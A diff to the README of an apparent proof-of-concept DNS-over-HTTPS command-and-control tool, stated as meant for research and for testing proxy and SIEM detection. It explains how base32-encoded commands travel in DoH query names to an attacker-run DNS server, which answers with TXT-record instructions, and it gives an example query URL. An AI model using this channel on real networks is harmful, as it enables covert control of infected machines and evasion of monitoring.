@@ -1,24 +1,25 @@
 # Dns-over-HTTPS-DOH
 This project provides a proof-of-concept implementation of a Command and Control (C2) infrastructure using DNS over HTTPS (DoH). 
-DoH C2 allows for covert communication between the C2 server and the infected client machines by leveraging encrypted DNS queries
+DoH C2 allows for covert communication between the C2 server and the infected client machines by leveraging  DNS queries
 thereby making the traffic appear legitimate and harder to detect by traditional network monitoring tools.
-
-# Architecture
-![image](https://github.com/user-attachments/assets/e0e0c705-e5a2-4934-b265-f70e39ca668b)  
-
-The python program on the client side sends HTTPS request (TCP/443) to DoH Server to resolve a destination domain where the c2 is hosted.  
-An attacker can use the part which is between the name and & in the url to inject txt record which is not bigger than 512 bytes of size.  Example: https[:]//dns.google.com/resolve?name=SINGLE-1-K5EE6QKNJEFA====.send.example.com.co&type=TXT  
-1. '**SINGLE-1-K5EE6QKNJEFA====**' is base32 encoded query (K5EE6QKNJEFA====  is basically WHOAMI
-)  
-2.send.example.com.co => the DNS c2 server.  
-  
-The dns.google.com is instructed to query the send.example.com.co DNS server for the TXT record.  
-The DNS server send.example.com.co  returns back txt record in which there are instructions what the client needs to perform next. Bellow is example it the answer section of the response are the instructions the client/malware will execute.  
 
 # Testing and Limitations
 This project is intended for educational purposes and authorized security research only. 
 Bypassing antivirus software or other security measures is not within the scope of this project. 
 It is designed for testing in controlled environments to demonstrate the feasibility and mechanics of using DoH for C2 communication **to test enterprise corporate forward proxy detection and improve any custom build signatures in SIEMs.**
+
+# Architecture
+![image](https://github.com/user-attachments/assets/e0e0c705-e5a2-4934-b265-f70e39ca668b)  
+
+From the above picture the python program on the client side (PC) sends HTTPS request (TCP/443) to DoH Server e.g dns.google.com, to resolve a destination domain where the c2 is hosted e.g example.com.co    
+An attacker can use the part which is between the** name and &** in the url to inject txt record  not bigger than 512 bytes of size.  Example: https[:]//dns.google.com/resolve?name**=SINGLE-1-K5EE6QKNJEFA====.send.example.com.co**&type=TXT  
+1. '**SINGLE-1-K5EE6QKNJEFA====**' is base32 encoded query (K5EE6QKNJEFA====  is basically WHOAMI
+)  
+2.send.example.com.co => the DNS c2 server.  
+  
+The dns.google.com is instructed to query send.example.com.co DNS server for the TXT record.  
+The DNS server send.example.com.co which is controlled back by us, returns back txt record in which there are instructions what the client (PC) needs to perform/execute.
+
 
 # Features
 **Covert Communication**: Utilizes DoH to encode and disguise C2 traffic.
